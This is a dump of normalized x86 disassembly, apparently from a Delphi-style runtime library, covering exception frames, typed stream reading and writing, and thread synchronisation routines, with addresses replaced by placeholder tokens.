mov eax [ r-xdata ]
call sub_40321c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a0dc
xor eax eax
push ebp
push sub_41eaff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41a294
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb06
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_40324c
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_41a238
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41eb50
call sub_402844
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a54
jmp r-xdata
call sub_403a00
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41cc54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebc0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41eb7f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41cdfc
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a00
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebc0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_40324c
sub_41ebec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ec96
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41ec69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41eea8
cmp al 0xb
je r-xdata
mov eax ebx
call sub_416518
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41cf44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41cf7c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec9d
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41eccc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d46c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40408c
mov eax esi
call j_sub_404468
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d46c
pop edx
pop esi
pop ebx
retn
sub_41ed08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41edb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d448
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41edc4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404224
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41edbc
lea eax [ ebp - 0x8 ]
call sub_4046a8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41eea8
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d46c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045e8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d46c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d46c
jmp r-xdata
jmp r-xdata
call sub_41cf44
sub_41edc4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ee9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d448
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41ed08
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047f4
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eea2
lea eax [ ebp - 0xc ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41eea8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d46c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048f0
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41d46c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d46c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045e8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d46c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405db8
jmp r-xdata
jmp r-xdata
call sub_41cf44
sub_41eebc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41eef8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41eccc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eeff
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41ef04
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d104
test al al
je r-xdata
mov eax [ ebx ]
call sub_41efb8
mov eax [ ebx ]
call sub_41e070
pop ebx
pop ebp
retn
sub_41ef2c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d46c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f3b0
pop ebx
pop ecx
pop ebp
retn
sub_41ef5c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d104
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d448
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41e070
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41f3b0
jmp r-xdata
mov eax [ ebx ]
call sub_41efb8
mov eax [ ebx ]
call sub_41d104
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f154
mov eax [ ebx ]
call sub_41e070
sub_41efb8
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f147
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41eea8
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f14e
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
jmp [ eax * 4 + jump_table_41efef ]
push ebp
call sub_41ef04
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41eccc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ef2c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eebc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ef2c
pop ecx
jmp r-xdata
push ebp
call sub_41ef5c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
push ebp
mov eax 0x2
call sub_41ef2c
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f3b0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ef2c
pop ecx
sub_41f154
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f191
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41eccc
mov eax ebx
call sub_41efb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f198
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41f19c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41f234
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41d104
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41eccc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41eccc
jmp r-xdata
mov eax ebx
call sub_41f154
mov eax ebx
call sub_41e070
jmp r-xdata
mov eax ebx
call sub_41d104
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41f19c
mov eax ebx
call sub_41e070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f23b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
sub_41f244
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f2e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404034
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4200e0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2f0
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
sub_41f314
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41f33c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d39c
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4198d8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403478
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41d39c
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41f3b0
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41d46c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41d46c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41f3f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f5a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41cfd0
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f57c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d46c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41befc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41d46c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c88c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f557
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41ed08
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41d46c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41befc
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d46c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_41592c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
lea eax [ ebp - 0x1c ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d454
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f55e
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_41f5c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f7ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f1e8
mov eax [ ebp - 0x4 ]
call sub_41d448
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
jmp [ eax * 4 + jump_table_41f602 ]
mov eax [ ebp - 0x4 ]
call sub_41eea8
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dfb8
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4135f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dfb8
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4135f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dfb8
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4135f0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd9c
mov eax ebx
call sub_4137e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dde0
mov eax ebx
call sub_4137e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de24
mov eax ebx
call sub_413810
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41de74
mov eax ebx
call sub_4137fc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ed08
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413824
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41edc4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4138a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eea8
cmp al 0x9
sete dl
mov eax ebx
call sub_4137c0
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41f3f8
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f510
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e024
push edx
push eax
mov eax ebx
call sub_4136ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7c1
lea eax [ ebp - 0x1c ]
call sub_40f1fc
lea eax [ ebp - 0xc ]
call sub_4046a8
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax ebx
call sub_415a14
jmp r-xdata
sub_41f7c8
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41f814
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41f840
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f7c8
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f7c8
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41f7c8
jmp r-xdata
pop edx
pop ebx
retn
sub_41f8c4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043a8
je r-xdata
mov eax esi
call sub_40425c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40425c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f7c8
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41f7c8
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f7c8
mov dl 0x6
mov eax ebx
call sub_41f9b0
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f7c8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41f7c8
sub_41f95c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f9a1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405e5c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41f8c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9a8
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41fa38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
call sub_41fa10
mov eax ebx
call sub_41fa1c
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fbc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fba7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbae
mov eax [ ebp - 0xc ]
call sub_40324c
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a238
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a128
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41fb71
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41fb42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41fbd8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41fd90
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41fc24
push ebx
push esi
push ecx
call sub_4035d8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41fe78
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41fe20
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41a7b0
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41fde8
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035c0
lea eax [ ebx + 0x14 ]
call sub_40d420
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_41a238
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41fca8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a294
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a0dc
mov edx ebx
mov eax esi
call sub_41fca8
sub_41fd3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a0dc
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x10 ] eax
sub_41fd68
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41a37c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_40324c
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41fd90
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403448
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41fd3c
mov dl 0x1
mov eax ebx
call sub_4202b0
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420260
sub_41fde8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4202b0
mov edx ebx
mov eax esi
call sub_41fd68
pop edi
pop esi
pop ebx
retn
sub_41fe20
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41a320
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41fde8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
